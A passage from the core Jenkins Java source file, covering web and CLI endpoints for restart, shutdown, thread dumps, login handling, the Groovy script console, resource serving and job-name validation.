    } catch (InterruptedException e) {\n            throw new AssertionError(); // impossible\n        }\n    }\n\n    @CLIMethod(name=\"quiet-down\")\n    public HttpRedirect doQuietDown(\n            @Option(name=\"-block\",usage=\"Block until the system really quiets down and no builds are running\") @QueryParameter boolean block,\n            @Option(name=\"-timeout\",usage=\"If non-zero, only block up to the specified number of milliseconds\") @QueryParameter int timeout) throws InterruptedException, IOException {\n        synchronized (this) {\n            checkPermission(ADMINISTER);\n            isQuietingDown = true;\n        }\n        if (block) {\n            if (timeout > 0) timeout += System.currentTimeMillis();\n            while (isQuietingDown\n                   && (timeout <= 0 || System.currentTimeMillis() < timeout)\n                   && !RestartListener.isAllReady()) {\n                Thread.sleep(1000);\n            }\n        }\n        return new HttpRedirect(\".\");\n    }\n\n    @CLIMethod(name=\"cancel-quiet-down\")\n    public synchronized HttpRedirect doCancelQuietDown() {\n        checkPermission(ADMINISTER);\n        isQuietingDown = false;\n        getQueue().scheduleMaintenance();\n        return new HttpRedirect(\".\");\n    }\n\n    /**\n     * Backward compatibility. Redirect to the thread dump.\n     */\n    public void doClassicThreadDump(StaplerResponse rsp) throws IOException, ServletException {\n        rsp.sendRedirect2(\"threadDump\");\n    }\n\n    /**\n     * Obtains the thread dump of all slaves (including the master.)\n     *\n     * <p>\n     * Since this is for diagnostics, it has a built-in precautionary measure against hang slaves.\n     */\n    public Map<String,Map<String,String>> getAllThreadDumps() throws IOException, InterruptedException {\n        checkPermission(ADMINISTER);\n\n        // issue the requests all at once\n        Map<String,Future<Map<String,String>>> future = new HashMap<String, Future<Map<String, String>>>();\n\n        for (Computer c : getComputers()) {\n            try {\n                future.put(c.getName(), RemotingDiagnostics.getThreadDumpAsync(c.getChannel()));\n            } catch(Exception e) {\n                LOGGER.info(\"Failed to get thread dump for node \" + c.getName() + \": \" + e.getMessage());\n            }\n        }\n\t\tif (toComputer() == null) {\n\t\t\tfuture.put(\"master\", RemotingDiagnostics.getThreadDumpAsync(MasterComputer.localChannel));\n\t\t}\n\n        // if the result isn't available in 5 sec, ignore that.\n        // this is a precaution against hang nodes\n        long endTime = System.currentTimeMillis() + 5000;\n\n        Map<String,Map<String,String>> r = new HashMap<String, Map<String, String>>();\n        for (Entry<String, Future<Map<String, String>>> e : future.entrySet()) {\n            try {\n                r.put(e.getKey(), e.getValue().get(endTime-System.currentTimeMillis(), TimeUnit.MILLISECONDS));\n            } catch (Exception x) {\n                StringWriter sw = new StringWriter();\n                x.printStackTrace(new PrintWriter(sw,true));\n                r.put(e.getKey(), Collections.singletonMap(\"Failed to retrieve thread dump\",sw.toString()));\n            }\n        }\n        return r;\n    }\n\n    public synchronized TopLevelItem doCreateItem( StaplerRequest req, StaplerResponse rsp ) throws IOException, ServletException {\n        return itemGroupMixIn.createTopLevelItem(req, rsp);\n    }\n\n    /**\n     * @since 1.319\n     */\n    public TopLevelItem createProjectFromXML(String name, InputStream xml) throws IOException {\n        return itemGroupMixIn.createProjectFromXML(name, xml);\n    }\n\n\n    @SuppressWarnings({\"unchecked\"})\n    public <T extends TopLevelItem> T copy(T src, String name) throws IOException {\n        return itemGroupMixIn.copy(src, name);\n    }\n\n    // a little more convenient overloading that assumes the caller gives us the right type\n    // (or else it will fail with ClassCastException)\n    public <T extends AbstractProject<?,?>> T copy(T src, String name) throws IOException {\n        return (T)copy((TopLevelItem)src,name);\n    }\n\n    public synchronized void doCreateView( StaplerRequest req, StaplerResponse rsp ) throws IOException, ServletException, FormException {\n        checkPermission(View.CREATE);\n        addView(View.create(req,rsp, this));\n    }\n\n    /**\n     * Check if the given name is suitable as a name\n     * for job, view, etc.\n     *\n     * @throws ParseException\n     *      if the given name is not good\n     */\n    public static void checkGoodName(String name) throws Failure {\n        if(name==null || name.length()==0)\n            throw new Failure(Messages.Hudson_NoName());\n\n        for( int i=0; i<name.length(); i++ ) {\n            char ch = name.charAt(i);\n            if(Character.isISOControl(ch)) {\n                throw new Failure(Messages.Hudson_ControlCodeNotAllowed(toPrintableName(name)));\n            }\n            if(\"?*/\\\\%!@#$^&|<>[]:;\".indexOf(ch)!=-1)\n                throw new Failure(Messages.Hudson_UnsafeChar(ch));\n        }\n\n        // looks good\n    }\n\n    /**\n     * Makes sure that the given name is good as a job name.\n     * @return trimmed name if valid; throws ParseException if not\n     */\n    private String checkJobName(String name) throws Failure {\n        checkGoodName(name);\n        name = name.trim();\n        projectNamingStrategy.checkName(name);\n        if(getItem(name)!=null)\n            throw new Failure(Messages.Hudson_JobAlreadyExists(name));\n        // looks good\n        return name;\n    }\n\n    private static String toPrintableName(String name) {\n        StringBuilder printableName = new StringBuilder();\n        for( int i=0; i<name.length(); i++ ) {\n            char ch = name.charAt(i);\n            if(Character.isISOControl(ch))\n                printableName.append(\"\\\\u\").append((int)ch).append(';');\n            else\n                printableName.append(ch);\n        }\n        return printableName.toString();\n    }\n\n    /**\n     * Checks if the user was successfully authenticated.\n     *\n     * @see BasicAuthenticationFilter\n     */\n    public void doSecured( StaplerRequest req, StaplerResponse rsp ) throws IOException, ServletException {\n        if(req.getUserPrincipal()==null) {\n            // authentication must have failed\n            rsp.setStatus(HttpServletResponse.SC_UNAUTHORIZED);\n            return;\n        }\n\n        // the user is now authenticated, so send him back to the target\n        String path = req.getContextPath()+req.getOriginalRestOfPath();\n        String q = req.getQueryString();\n        if(q!=null)\n            path += '?'+q;\n\n        rsp.sendRedirect2(path);\n    }\n\n    /**\n     * Called once the user logs in. Just forward to the top page.\n     */\n    public void doLoginEntry( StaplerRequest req, StaplerResponse rsp ) throws IOException {\n        if(req.getUserPrincipal()==null) {\n            rsp.sendRedirect2(\"noPrincipal\");\n            return;\n        }\n\n        String from = req.getParameter(\"from\");\n        if(from!=null && from.startsWith(\"/\") && !from.equals(\"/loginError\")) {\n            rsp.sendRedirect2(from);    // I'm bit uncomfortable letting users redircted to other sites, make sure the URL falls into this domain\n            return;\n        }\n\n        String url = AbstractProcessingFilter.obtainFullRequestUrl(req);\n        if(url!=null) {\n            // if the login redirect is initiated by Acegi\n            // this should send the user back to where s/he was from.\n            rsp.sendRedirect2(url);\n            return;\n        }\n\n        rsp.sendRedirect2(\".\");\n    }\n\n    /**\n     * Logs out the user.\n     */\n    public void doLogout( StaplerRequest req, StaplerResponse rsp ) throws IOException, ServletException {\n        securityRealm.doLogout(req, rsp);\n    }\n\n    /**\n     * Serves jar files for JNLP slave agents.\n     */\n    public Slave.JnlpJar getJnlpJars(String fileName) {\n        return new Slave.JnlpJar(fileName);\n    }\n\n    public Slave.JnlpJar doJnlpJars(StaplerRequest req) {\n        return new Slave.JnlpJar(req.getRestOfPath().substring(1));\n    }\n\n    /**\n     * Reloads the configuration.\n     */\n    @CLIMethod(name=\"reload-configuration\")\n    public synchronized HttpResponse doReload() throws IOException {\n        checkPermission(ADMINISTER);\n\n        // engage \"loading ...\" UI and then run the actual task in a separate thread\n        servletContext.setAttribute(\"app\", new HudsonIsLoading());\n\n        new Thread(\"Jenkins config reload thread\") {\n            @Override\n            public void run() {\n                try {\n                    ACL.impersonate(ACL.SYSTEM);\n                    reload();\n                } catch (Exception e) {\n                    LOGGER.log(SEVERE,\"Failed to reload Jenkins config\",e);\n                    WebApp.get(servletContext).setApp(new JenkinsReloadFailed(e));\n                }\n            }\n        }.start();\n\n        return HttpResponses.redirectViaContextPath(\"/\");\n    }\n\n    /**\n     * Reloads the configuration synchronously.\n     */\n    public void reload() throws IOException, InterruptedException, ReactorException {\n        executeReactor(null, loadTasks());\n        User.reload();\n        servletContext.setAttribute(\"app\", this);\n    }\n\n    /**\n     * Do a finger-print check.\n     */\n    public void doDoFingerprintCheck( StaplerRequest req, StaplerResponse rsp ) throws IOException, ServletException {\n        // Parse the request\n        MultipartFormDataParser p = new MultipartFormDataParser(req);\n        if(isUseCrumbs() && !getCrumbIssuer().validateCrumb(req, p)) {\n            rsp.sendError(HttpServletResponse.SC_FORBIDDEN,\"No crumb found\");\n        }\n        try {\n            rsp.sendRedirect2(req.getContextPath()+\"/fingerprint/\"+\n                Util.getDigestOf(p.getFileItem(\"name\").getInputStream())+'/');\n        } finally {\n            p.cleanUp();\n        }\n    }\n\n    /**\n     * For debugging. Expose URL to perform GC.\n     */\n    @edu.umd.cs.findbugs.annotations.SuppressWarnings(\"DM_GC\")\n    public void doGc(StaplerResponse rsp) throws IOException {\n        checkPermission(Jenkins.ADMINISTER);\n        System.gc();\n        rsp.setStatus(HttpServletResponse.SC_OK);\n        rsp.setContentType(\"text/plain\");\n        rsp.getWriter().println(\"GCed\");\n    }\n\n    /**\n     * End point that intentionally throws an exception to test the error behaviour.\n     */\n    public void doException() {\n        throw new RuntimeException();\n    }\n\n    public ContextMenu doContextMenu(StaplerRequest request, StaplerResponse response) throws IOException, JellyException {\n        ContextMenu menu = new ContextMenu().from(this, request, response);\n        for (MenuItem i : menu.items) {\n            if (i.url.equals(\"/manage\")) {\n                // add \"Manage Jenkins\" subitems\n                i.subMenu = new ContextMenu().from(this, request, response, \"manage\");\n            }\n        }\n        return menu;\n    }\n\n    /**\n     * Obtains the heap dump.\n     */\n    public HeapDump getHeapDump() throws IOException {\n        return new HeapDump(this,MasterComputer.localChannel);\n    }\n\n    /**\n     * Simulates OutOfMemoryError.\n     * Useful to make sure OutOfMemoryHeapDump setting.\n     */\n    public void doSimulateOutOfMemory() throws IOException {\n        checkPermission(ADMINISTER);\n\n        System.out.println(\"Creating artificial OutOfMemoryError situation\");\n        List<Object> args = new ArrayList<Object>();\n        while (true)\n            args.add(new byte[1024*1024]);\n    }\n\n    private transient final Map<UUID,FullDuplexHttpChannel> duplexChannels = new HashMap<UUID, FullDuplexHttpChannel>();\n\n    /**\n     * Handles HTTP requests for duplex channels for CLI.\n     */\n    public void doCli(StaplerRequest req, StaplerResponse rsp) throws IOException, ServletException, InterruptedException {\n        if (!\"POST\".equals(req.getMethod())) {\n            // for GET request, serve _cli.jelly, assuming this is a browser\n            checkPermission(READ);\n            req.getView(this,\"_cli.jelly\").forward(req,rsp);\n            return;\n        }\n\n        // do not require any permission to establish a CLI connection\n        // the actual authentication for the connecting Channel is done by CLICommand\n\n        UUID uuid = UUID.fromString(req.getHeader(\"Session\"));\n        rsp.setHeader(\"Hudson-Duplex\",\"\"); // set the header so that the client would know\n\n        FullDuplexHttpChannel server;\n        if(req.getHeader(\"Side\").equals(\"download\")) {\n            duplexChannels.put(uuid,server=new FullDuplexHttpChannel(uuid, !hasPermission(ADMINISTER)) {\n                protected void main(Channel channel) throws IOException, InterruptedException {\n                    // capture the identity given by the transport, since this can be useful for SecurityRealm.createCliAuthenticator()\n                    channel.setProperty(CLICommand.TRANSPORT_AUTHENTICATION,getAuthentication());\n                    channel.setProperty(CliEntryPoint.class.getName(),new CliManagerImpl(channel));\n                }\n            });\n            try {\n                server.download(req,rsp);\n            } finally {\n                duplexChannels.remove(uuid);\n            }\n        } else {\n            duplexChannels.get(uuid).upload(req,rsp);\n        }\n    }\n\n    /**\n     * Binds /userContent/... to $JENKINS_HOME/userContent.\n     */\n    public DirectoryBrowserSupport doUserContent() {\n        return new DirectoryBrowserSupport(this,getRootPath().child(\"userContent\"),\"User content\",\"folder.png\",true);\n    }\n\n    /**\n     * Perform a restart of Hudson, if we can.\n     *\n     * This first replaces \"app\" to {@link HudsonIsRestarting}\n     */\n    @CLIMethod(name=\"restart\")\n    public void doRestart(StaplerRequest req, StaplerResponse rsp) throws IOException, ServletException, RestartNotSupportedException {\n        checkPermission(ADMINISTER);\n        if (req != null && req.getMethod().equals(\"GET\")) {\n            req.getView(this,\"_restart.jelly\").forward(req,rsp);\n            return;\n        }\n\n        restart();\n\n        if (rsp != null) // null for CLI\n            rsp.sendRedirect2(\".\");\n    }\n\n    /**\n     * Queues up a restart of Hudson for when there are no builds running, if we can.\n     *\n     * This first replaces \"app\" to {@link HudsonIsRestarting}\n     *\n     * @since 1.332\n     */\n    @CLIMethod(name=\"safe-restart\")\n    public HttpResponse doSafeRestart(StaplerRequest req) throws IOException, ServletException, RestartNotSupportedException {\n        checkPermission(ADMINISTER);\n        if (req != null && req.getMethod().equals(\"GET\"))\n            return HttpResponses.forwardToView(this,\"_safeRestart.jelly\");\n\n        safeRestart();\n\n        return HttpResponses.redirectToDot();\n    }\n\n    /**\n     * Performs a restart.\n     */\n    public void restart() throws RestartNotSupportedException {\n        final Lifecycle lifecycle = Lifecycle.get();\n        lifecycle.verifyRestartable(); // verify that Hudson is restartable\n        servletContext.setAttribute(\"app\", new HudsonIsRestarting());\n\n        new Thread(\"restart thread\") {\n            final String exitUser = getAuthentication().getName();\n            @Override\n            public void run() {\n                try {\n                    ACL.impersonate(ACL.SYSTEM);\n\n                    // give some time for the browser to load the \"reloading\" page\n                    Thread.sleep(5000);\n                    LOGGER.severe(String.format(\"Restarting VM as requested by %s\",exitUser));\n                    for (RestartListener listener : RestartListener.all())\n                        listener.onRestart();\n                    lifecycle.restart();\n                } catch (InterruptedException e) {\n                    LOGGER.log(Level.WARNING, \"Failed to restart Hudson\",e);\n                } catch (IOException e) {\n                    LOGGER.log(Level.WARNING, \"Failed to restart Hudson\",e);\n                }\n            }\n        }.start();\n    }\n\n    /**\n     * Queues up a restart to be performed once there are no builds currently running.\n     * @since 1.332\n     */\n    public void safeRestart() throws RestartNotSupportedException {\n        final Lifecycle lifecycle = Lifecycle.get();\n        lifecycle.verifyRestartable(); // verify that Hudson is restartable\n        // Quiet down so that we won't launch new builds.\n        isQuietingDown = true;\n\n        new Thread(\"safe-restart thread\") {\n            final String exitUser = getAuthentication().getName();\n            @Override\n            public void run() {\n                try {\n                    ACL.impersonate(ACL.SYSTEM);\n\n                    // Wait 'til we have no active executors.\n                    doQuietDown(true, 0);\n\n                    // Make sure isQuietingDown is still true.\n                    if (isQuietingDown) {\n                        servletContext.setAttribute(\"app\",new HudsonIsRestarting());\n                        // give some time for the browser to load the \"reloading\" page\n                        LOGGER.info(\"Restart in 10 seconds\");\n                        Thread.sleep(10000);\n                        LOGGER.severe(String.format(\"Restarting VM as requested by %s\",exitUser));\n                        for (RestartListener listener : RestartListener.all())\n                            listener.onRestart();\n                        lifecycle.restart();\n                    } else {\n                        LOGGER.info(\"Safe-restart mode cancelled\");\n                    }\n                } catch (InterruptedException e) {\n                    LOGGER.log(Level.WARNING, \"Failed to restart Hudson\",e);\n                } catch (IOException e) {\n                    LOGGER.log(Level.WARNING, \"Failed to restart Hudson\",e);\n                }\n            }\n        }.start();\n    }\n\n    /**\n     * Shutdown the system.\n     * @since 1.161\n     */\n    @CLIMethod(name=\"shutdown\")\n    public void doExit( StaplerRequest req, StaplerResponse rsp ) throws IOException {\n        checkPermission(ADMINISTER);\n        LOGGER.severe(String.format(\"Shutting down VM as requested by %s from %s\",\n                getAuthentication().getName(), req!=null?req.getRemoteAddr():\"???\"));\n        if (rsp!=null) {\n            rsp.setStatus(HttpServletResponse.SC_OK);\n            rsp.setContentType(\"text/plain\");\n            PrintWriter w = rsp.getWriter();\n            w.println(\"Shutting down\");\n            w.close();\n        }\n\n        System.exit(0);\n    }\n\n\n    /**\n     * Shutdown the system safely.\n     * @since 1.332\n     */\n    @CLIMethod(name=\"safe-shutdown\")\n    public HttpResponse doSafeExit(StaplerRequest req) throws IOException {\n        checkPermission(ADMINISTER);\n        isQuietingDown = true;\n        final String exitUser = getAuthentication().getName();\n        final String exitAddr = req!=null ? req.getRemoteAddr() : \"unknown\";\n        new Thread(\"safe-exit thread\") {\n            @Override\n            public void run() {\n                try {\n                    ACL.impersonate(ACL.SYSTEM);\n                    LOGGER.severe(String.format(\"Shutting down VM as requested by %s from %s\",\n                                                exitUser, exitAddr));\n                    // Wait 'til we have no active executors.\n                    while (isQuietingDown\n                           && (overallLoad.computeTotalExecutors() > overallLoad.computeIdleExecutors())) {\n                        Thread.sleep(5000);\n                    }\n                    // Make sure isQuietingDown is still true.\n                    if (isQuietingDown) {\n                        cleanUp();\n                        System.exit(0);\n                    }\n                } catch (InterruptedException e) {\n                    LOGGER.log(Level.WARNING, \"Failed to shutdown Hudson\",e);\n                }\n            }\n        }.start();\n\n        return HttpResponses.plainText(\"Shutting down as soon as all jobs are complete\");\n    }\n\n    /**\n     * Gets the {@link Authentication} object that represents the user\n     * associated with the current request.\n     */\n    public static Authentication getAuthentication() {\n        Authentication a = SecurityContextHolder.getContext().getAuthentication();\n        // on Tomcat while serving the login page, this is null despite the fact\n        // that we have filters. Looking at the stack trace, Tomcat doesn't seem to\n        // run the request through filters when this is the login request.\n        // see http://www.nabble.com/Matrix-authorization-problem-tp14602081p14886312.html\n        if(a==null)\n            a = ANONYMOUS;\n        return a;\n    }\n\n    /**\n     * For system diagnostics.\n     * Run arbitrary Groovy script.\n     */\n    public void doScript(StaplerRequest req, StaplerResponse rsp) throws IOException, ServletException {\n        doScript(req, rsp, req.getView(this, \"_script.jelly\"));\n    }\n\n    /**\n     * Run arbitrary Groovy script and return result as plain text.\n     */\n    public void doScriptText(StaplerRequest req, StaplerResponse rsp) throws IOException, ServletException {\n        doScript(req, rsp, req.getView(this, \"_scriptText.jelly\"));\n    }\n\n    private void doScript(StaplerRequest req, StaplerResponse rsp, RequestDispatcher view) throws IOException, ServletException {\n        // ability to run arbitrary script is dangerous\n        checkPermission(RUN_SCRIPTS);\n\n        String text = req.getParameter(\"script\");\n        if (text != null) {\n            try {\n                req.setAttribute(\"output\",\n                        RemotingDiagnostics.executeGroovy(text, MasterComputer.localChannel));\n            } catch (InterruptedException e) {\n                throw new ServletException(e);\n            }\n        }\n\n        view.forward(req, rsp);\n    }\n\n    /**\n     * Evaluates the Jelly script submitted by the client.\n     *\n     * This is useful for system administration as well as unit testing.\n     */\n    @RequirePOST\n    public void doEval(StaplerRequest req, StaplerResponse rsp) throws IOException, ServletException {\n        checkPermission(ADMINISTER);\n\n        try {\n            MetaClass mc = WebApp.getCurrent().getMetaClass(getClass());\n            Script script = mc.classLoader.loadTearOff(JellyClassLoaderTearOff.class).createContext().compileScript(new InputSource(req.getReader()));\n            new JellyRequestDispatcher(this,script).forward(req,rsp);\n        } catch (JellyException e) {\n            throw new ServletException(e);\n        }\n    }\n\n    /**\n     * Sign up for the user account.\n     */\n    public void doSignup( StaplerRequest req, StaplerResponse rsp ) throws IOException, ServletException {\n        req.getView(getSecurityRealm(), \"signup.jelly\").forward(req, rsp);\n    }\n\n    /**\n     * Changes the icon size by changing the cookie\n     */\n    public void doIconSize( StaplerRequest req, StaplerResponse rsp ) throws IOException, ServletException {\n        String qs = req.getQueryString();\n        if(qs==null || !ICON_SIZE.matcher(qs).matches())\n            throw new ServletException();\n        Cookie cookie = new Cookie(\"iconSize\", qs);\n        cookie.setMaxAge(/* ~4 mo. */9999999); // #762\n        rsp.addCookie(cookie);\n        String ref = req.getHeader(\"Referer\");\n        if(ref==null)   ref=\".\";\n        rsp.sendRedirect2(ref);\n    }\n\n    public void doFingerprintCleanup(StaplerResponse rsp) throws IOException {\n        FingerprintCleanupThread.invoke();\n        rsp.setStatus(HttpServletResponse.SC_OK);\n        rsp.setContentType(\"text/plain\");\n        rsp.getWriter().println(\"Invoked\");\n    }\n\n    public void doWorkspaceCleanup(StaplerResponse rsp) throws IOException {\n        WorkspaceCleanupThread.invoke();\n        rsp.setStatus(HttpServletResponse.SC_OK);\n        rsp.setContentType(\"text/plain\");\n        rsp.getWriter().println(\"Invoked\");\n    }\n\n    /**\n     * If the user chose the default JDK, make sure we got 'java' in PATH.\n     */\n    public FormValidation doDefaultJDKCheck(StaplerRequest request, @QueryParameter String value) {\n        if(!value.equals(\"(Default)\"))\n            // assume the user configured named ones properly in system config ---\n            // or else system config should have reported form field validation errors.\n            return FormValidation.ok();\n\n        // default JDK selected. Does such java really exist?\n        if(JDK.isDefaultJDKValid(Jenkins.this))\n            return FormValidation.ok();\n        else\n            return FormValidation.errorWithMarkup(Messages.Hudson_NoJavaInPath(request.getContextPath()));\n    }\n\n    /**\n     * Makes sure that the given name is good as a job name.\n     */\n    public FormValidation doCheckJobName(@QueryParameter String value) {\n        // this method can be used to check if a file exists anywhere in the file system,\n        // so it should be protected.\n        checkPermission(Item.CREATE);\n\n        if(fixEmpty(value)==null)\n            return FormValidation.ok();\n\n        try {\n            checkJobName(value);\n            return FormValidation.ok();\n        } catch (Failure e) {\n            return FormValidation.error(e.getMessage());\n        }\n    }\n\n    /**\n     * Checks if a top-level view with the given name exists.\n     */\n    public FormValidation doViewExistsCheck(@QueryParameter String value) {\n        checkPermission(View.CREATE);\n\n        String view = fixEmpty(value);\n        if(view==null) return FormValidation.ok();\n\n        if(getView(view)==null)\n            return FormValidation.ok();\n        else\n            return FormValidation.error(Messages.Hudson_ViewAlreadyExists(view));\n    }\n\n    /**\n     * Serves static resources placed along with Jelly view files.\n     * <p>\n     * This method can serve a lot of files, so care needs to be taken\n     * to make this method secure. It's not clear to me what's the best\n     * strategy here, though the current implementation is based on\n     * file extensions.\n     */\n    public void doResources(StaplerRequest req, StaplerResponse rsp) throws IOException, ServletException {\n        String path = req.getRestOfPath();\n        // cut off the \"...\" portion of /resources/.../path/to/file\n        // as this is only used to make path unique (which in turn\n        // allows us to set a long expiration date\n        path = path.substring(path.indexOf('/',1)+1);\n\n        int idx = path.lastIndexOf('.');\n        String extension = path.substring(idx+1);\n        if(ALLOWED_RESOURCE_EXTENSIONS.contains(extension)) {\n            URL url = pluginManager.uberClassLoader.getResource(path);\n            if(url!=null) {\n                long expires = MetaClass.NO_CACHE ? 0 : 365L * 24 * 60 * 60 * 1000; /*1 year*/\n                rsp.serveFile(req,url,expires);\n                return;\n            }\n        }\n        rsp.sendError(HttpServletResponse.SC_NOT_FOUND);\n    }\n\n    /**\n     * Extension list that {@link #doResources(StaplerRequest, StaplerResponse)} can serve.\n     * This set is mutable to allow plugins to add additional extensions.\n     */\n    public static final Set<String> ALLOWED_RESOURCE_EXTENSIONS = new HashSet<String>(Arrays.asList(\n        \"js|css|jpeg|jpg|png|gif|html|htm\".split(\"\\\\|\")\n    ));\n\n    /**\n     * Checks if container uses UTF-8 to decode URLs. See\n     * http://wiki.jenkins-ci.org/display/JENKINS/Tomcat#Tomcat-i18n\n     */\n    public FormValidation doCheckURIEncoding(StaplerRequest request) throws IOException {\n        // expected is non-ASCII String\n        final String expected = \"\\u57f7\\u4e8b\";\n        final String value = fixEmpty(request.getParameter(\"value\"));\n        if (!expected.equals(value))\n            return FormValidation.warningWithMarkup(Messages.Hudson_NotUsesUTF8ToDecodeURL());\n        return FormValidation.ok();\n    }\n\n    /**\n     * Does not check when system default encoding is \"ISO-8859-1\".\n     */\n    public static boolean isCheckURIEncodingEnabled() {\n        return !\"ISO-8859-1\".equalsIgnoreCase(System.getProperty(\"file.encoding\"));\n    }\n\n    /**\n     * Rebuilds the dependency map.\n     */\n    public void rebuildDependencyGraph() {\n        DependencyGraph graph = new DependencyGraph();\n        graph.build();\n        // volatile acts a as a memory barrier here and therefore guarantees \n        // that graph is fully build, before it's visible to other threads\n        dependencyGraph = graph;\n    }\n\n    public DependencyGraph getDependencyGraph() {\n        return dependencyGraph;\n    }\n\n    // for Jelly\n    public List<ManagementLink> getManagementLinks() {\n        return ManagementLink.all();\n    }\n\n    /**\n     * Exposes the current user to <tt>/me</tt> URL.\n     */\n    public User getMe() {\n        User u = User.current();\n        if (u == null)\n            throw new AccessDeniedException(\"/me is not available when not logged in\");\n        return u;\n    }\n\n    /**\n     * Gets the {@link Widget}s registered on this object.\n     *\n     * <p>\n     * Plugins who wish to contribute boxes on the side panel can add widgets\n     * by {@code getWidgets().add(new MyWidget())} from {@link Plugin#start()}.\n     */\n    public List<Widget> getWidgets() {\n        return widgets;\n    }\n\n    public Object getTarget() {\n        try {\n            checkPermission(READ);\n        } catch (AccessDeniedException e) {\n            String rest = Stapler.getCurrentRequest().getRestOfPath();\n            if(rest.startsWith(\"/login\")\n            || rest.startsWith(\"/logout\")\n            || rest.startsWith(\"/accessDenied\")\n            || rest.startsWith(\"/adjuncts/\")\n            || rest.startsWith(\"/signup\")\n            || rest.startsWith(\"/tcpSlaveAgentListener\")\n            || rest.startsWith(\"/cli\")\n            || rest.startsWith(\"/federatedLoginService/\")\n            || rest.startsWith(\"/securityRealm\"))\n                return this;    // URLs that are always visible without READ permission\n\n            for (String name : getUnprotectedRootActions()) {\n                if (rest.startsWith(\"/\" + name + \"/\") || rest.equals(\"/\" + name)) {\n                    return this;\n                }\n            }\n\n            throw e;\n        }\n        return this;\n    }\n\n    /**\n     * Gets a list of unprotected root actions.\n     * These URL prefixes should be exempted from access control checks by container-managed security.\n     * Ideally would be synchronized with {@link #getTarget}.\n     * @return a list of {@linkplain Action#getUrlName URL names}\n     * @since 1.495\n     */\n    public Collection<String> getUnprotectedRootActions() {\n        Set<String> names = new TreeSet<String>();\n        names.add(\"jnlpJars\"); // XXX cleaner to refactor doJnlpJars into a URA\n        // XXX consider caching (expiring cache when actions changes)\n        for (Action a : getActions()) {\n            if (a instanceof UnprotectedRootAction) {\n                names.add(a.getUrlName());\n            }\n        }\n        return names;\n    }\n\n    /**\n     * Fallback to the primary view.\n     */\n    public View getStaplerFallback() {\n        return getPrimaryView();\n    }\n\n    /**\n     * This method checks all existing jobs to see if displayName is \n     * unique. It does not check the displayName against the displayName of the\n     * job that the user is configuring though to prevent a validation warning \n     * if the user sets the displayName to what it currently is.\n     * @param displayName\n     * @param currentJobName\n     * @return\n     */\n    boolean isDisplayNameUnique(String displayName, String currentJobName) {\n        Collection<TopLevelItem> itemCollection = items.values();\n        \n        // if there are a lot of projects, we'll have to store their \n        // display names in a HashSet or something for a quick check\n        for(TopLevelItem item : itemCollection) {\n            if(item.getName().equals(currentJobName)) {\n                // we won't compare the candidate displayName against the current\n                // item. This is to prevent an validation warning if the user \n                // sets the displayName to what the existing display name is\n                continue;\n            }\n            else if(displayName.equals(item.getDisplayName())) {\n                return false;\n            }\n        }\n        \n        return true;\n    }\n    \n    /**\n     * True if there is no item in Jenkins that has this name\n     * @param name The name to test\n     * @param currentJobName The name of the job that the user is configuring\n     * @return\n     */\n    boolean isNameUnique(String name, String currentJobName) {\n        Item item = getItem(name);\n        \n        if(null==item) {\n            // the candidate name didn't return any items so the name is unique\n            return true;\n        }\n        else if(item.getName().equals(currentJobName)) {\n            // the candidate name returned an item, but the item is the item\n            // that the user is configuring so this is ok\n            return true;\n        } \n        else {\n            // the candidate name returned an item, so it is not unique\n            return false;\n        }\n    }\n    \n    /**\n     * Checks to see if the candidate displayName collides with any \n     * existing display names or project names\n     * @param displayName The display name to test\n     * @param jobName The name of the job the user is configuring\n     * @return\n     */\n    public FormValidation doCheckDisplayName(@QueryParameter String displayName, \n            @QueryParameter String jobName) {\n        displayName = displayName.trim();\n        \n        if(LOGGER.isLoggable(Level.FINE)) {\n            LOGGER.log(Level.FINE, \"Current job name is \" + jobName);\n        }\n        \n        if(!isNameUnique(displayName, jobName)) {\n            return FormValidation.warning(Messages.Jenkins_CheckDisplayName_NameNotUniqueWarning(displayName));\n        }\n        else if(!isDisplayNameUnique(displayName, jobName)){\n            return FormValidation.warning(Messages.Jenkins_CheckDisplayName_DisplayNameNotUniqueWarning(displayName));\n        }\n        else {\n            return FormValidation.ok();\n        }\n    }\n    \n    public static class MasterComputer extends Computer {\n        protected MasterComputer() {\n            super(Jenkins.getInstance());\n        }\n\n        /**\n         * Returns \"\" to match with {@link Jenkins#getNodeName()}.\n         */\n        @Override\n        public String getName() {\n            return \"\";\n        }\n\n        @Override\n        public boolean isConnecting() {\n            return false;\n        }\n\n        @Override\n        public String getDisplayName() {\n            return Messages.Hudson_Computer_DisplayName();\n        }\n\n        @Override\n        public String getCaption() {\n            return Messages.Hudson_Computer_Caption();\n        }\n\n        @Override\n        public String getUrl() {\n            return \"computer/(master)/\";\n        }\n\n        public RetentionStrategy getRetentionStrategy() {\n            return RetentionStrategy.NOOP;\n        }\n\n        /**\n         * Report an error.\n         */\n        @Override\n        public HttpResponse doDoDelete() throws IOException {\n            throw HttpResponses.status(SC_BAD_REQUEST);\n        }\n\n        @Override\n        public void doConfigSubmit(StaplerRequest req, StaplerResponse rsp) throws IOException, ServletException, FormException {\n            Jenkins.getInstance().doConfigExecutorsSubmit(req, rsp);\n        }\n\n        @Override\n        public boolean hasPermission(Permission permission) {\n            // no one should be allowed to delete the master.\n            // this hides the \"delete\" link from the /computer/(master) page.\n            if(permission==Computer.DELETE)\n                return false;\n            // Configuration of master node requires ADMINISTER permission\n            return super.hasPermission(permission==Computer.CONFIGURE ? Jenkins.ADMINISTER : permission);\n        }\n\n        @Override\n        public VirtualChannel getChannel() {\n            return localChannel;\n        }\n\n        @Override\n        public Charset getDefaultCharset() {\n            return Charset.defaultCharset();\n        }\n\n        public List<LogRecord> getLogRecords() throws IOException, InterruptedException {\n            return logRecords;\n        }\n\n        public void doLaunchSlaveAgent(StaplerRequest req, StaplerResponse rsp) throws IOException, ServletException {\n            // this computer never returns null from channel, so\n            // this method shall never be invoked.\n            rsp.sendError(SC_NOT_FOUND);\n        }\n\n        protected Future<?> _connect(boolean forceReconnect) {\n            return Futures.precomputed(null);\n        }\n\n        /**\n         * {@link LocalChannel} instance that can be used to execute programs locally.\n         */\n        public static final LocalChannel localChannel = new LocalChannel(threadPoolForRemoting);\n    }\n\n    /**\n     * Shortcut for {@code Hudson.getInstance().lookup.get(type)}\n     */\n    public static <T> T lookup(Class<T> type) {\n        return Jenkins.getInstance().lookup.get(type);\n    }\n\n    /**\n     * Live view of recent {@link LogRecord}s produced by Hudson.\n     */\n    public static List<LogRecord> logRecords = Collections.emptyList(); // initialized to dummy value to avoid NPE\n\n    /**\n     * Thread-safe reusable {@link XStream}.\n     */\n    public static final XStream XSTREAM = new XStream2();\n\n    /**\n     * Alias to {@link 